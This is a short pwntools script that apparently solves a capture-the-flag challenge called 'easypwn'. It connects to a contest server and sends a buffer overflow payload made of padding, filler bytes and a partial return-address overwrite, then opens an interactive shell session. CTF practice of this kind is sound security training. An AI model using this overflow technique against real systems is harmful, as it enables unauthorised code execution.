from pwn import *

io = process("./easypwn")
io = remote('node5.anna.nssctf.cn', 28121)

payload = 'A'*0x1F + 'deadbeef' + '\xD5\x11'

io.sendline(payload)
io.interactive()